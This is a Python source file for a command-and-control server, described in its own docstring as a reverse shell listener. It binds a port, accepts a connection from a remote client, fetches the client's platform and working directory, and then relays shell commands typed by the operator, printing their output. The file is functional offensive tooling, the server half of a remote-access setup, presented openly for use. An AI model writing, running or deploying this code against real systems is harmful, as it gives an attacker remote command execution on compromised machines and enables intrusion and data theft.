from time import sleep
import socket
import sys


class Server(object):
    """
    A simple command and control server(Reverse Shell).
    """
    def __init__(self, host="", port=6667, recv_size=1024, listen=10, bind_retry=5):
        header = """ .oOOOo.
.O     o.
O       o               O
o       O              oOo
O       o O   o .oOo    o   .oOo. `OoOo.
o       O o   O `Ooo.   O   OooO'  o
`o     O' O   o     O   o   O      O
 `OoooO'  `OoOO `OoO'   `oO `OoO'  o
              o
           OoO'                         """
        print(header)
        self.host = host
        self.port = int(port)
        self.recv_size = int(recv_size)
        self.listen = int(listen)
        self.bind_retry = bind_retry
        self.connection, self.address = False, False

        self.client_platform = ''

        # Create the socket
        try:
            self.s = socket.socket()
        except socket.error as error_message:
            print('Could not create socket:', error_message)
            sys.exit()

        # Bind the socket
        self._bind_the_socket()
        self._accept_connections()

    def _bind_the_socket(self, attempts=1):
        """
        Bind the socket to the port.

        :return:
        """

        print('Starting on port', self.port, end=', ')
        try:
            # Bind & start listening.
            self.s.bind((self.host, self.port))
            self.s.listen(self.listen)
            print('waiting for client connections...', end='\n\n')

        except socket.error as error_message:
            print('Could not bind the socket:', error_message, '\n', 'Trying again...')
            sleep(1)

            # Try to bind the socket 5 times before giving up.
            if attempts == self.bind_retry:
                print('Could not bind the socket to the port after {} tries.  Aborting...'.format(self.bind_retry))
                sys.exit()
            self._bind_the_socket(attempts=attempts + 1)

    def _accept_connections(self):
        """
        Start accepting connections.

        :return:
        """

        # Accept the connection.
        self.connection, self.address = self.s.accept()
        print('Connection | IP', self.address[0], '| Port', self.address[1])

        # Get details about client.

        # The client platform is used to determine default commands for
        # getting the current working directory.
        print('Getting platform... ', end='')
        self.client_platform = self._send_command('single_command-get_platform')
        print('Client platform is "{}".'.format(self.client_platform), end='\n\n')

        # Get the current working directory and print it to the console.
        print(self._send_command('single_command-getcwd'), end='')

        # Start the main command loop
        self._start_command_loop()
        self.connection.close()

    def _send_command(self, command):
        """
        Send a single command to the client, and return the response.
        This is used for retrieving info from the clients.

        :param command:
        :return:
        """

        # Check out the command and make any modifications needed.
        command = self._check_command(command)

        # Set defaults.
        response = '> '
        accepting = True

        if not command:
            print(response, end='')

        # Send the command
        self.connection.send(str.encode(command))

        # Accept the response.
        total_response = ''
        while accepting:
            response = str(self.connection.recv(self.recv_size), 'utf-8')
            total_response += response

            # If we get less data than the total recv buffer, we are done accepting data.
            if len(response) < self.recv_size:
                accepting = False

        return total_response

    def _start_command_loop(self):
        """
        Send commands through to the clients.

        :return:
        """

        # Loop while accepting input and sending the commands to the client.
        while True:
            command = input(' ')
            response = '> '
            accepting = True
            command = self._check_command(command)
            if not command:
                print(response, end='')

            self.connection.send(str.encode(command))
            # Accept the response.
            while accepting:
                response = str(self.connection.recv(self.recv_size), 'utf-8')
                print(response.strip(), end='')
                if len(response) < self.recv_size:
                    accepting = False

    def _check_command(self, command):
        """
        Check the command and return True or False, or quit if the quit command is sent.

        :param command:
        :return:
        """

        if not self.connection:
            raise ConnectionError('Connection to client failed[1].')

        if command == 'quit' or command == 'exit':
            # Send the quit command to the client, which will make the client
            # close the current connection, and attempt to connect to the
            # server indefinitely.
            self.connection.send(str.encode('quit'))

            # Close the server's connection down.
            sleep(2)
            self.connection.close()
            self.s.close()
            sys.exit()

        if len(str.encode(command)) > 0:
            return command
        else:
            if self.client_platform == 'win32':
                return 'echo'
            else:
                return 'echo'


if __name__ == '__main__':

    the_host = ''
    the_port = 6667
    the_recv_size = 1024
    the_listen = 10
    the_bind_retry = 5

    def check_cli_arg(arg):
        global the_host
        global the_port
        global the_recv_size
        global the_listen
        global the_bind_retry

        if 'host=' in arg:
            the_host = arg.split('=')[1]
        elif 'port=' in arg:
            the_port = int(arg.split('=')[1])
        elif 'recv_size=' in arg:
            the_recv_size = int(arg.split('=')[1])
        elif 'listen=' in arg:
            the_listen = int(arg.split('=')[1])
        elif 'bind_retry=' in arg:
            the_bind_retry = int(arg.split('=')[1])

    for argument in sys.argv[1:]:
        check_cli_arg(argument)

    server = Server(
        host=the_host,
        port=the_port,
        recv_size=the_recv_size,
        listen=the_listen,
        bind_retry=the_bind_retry
    )
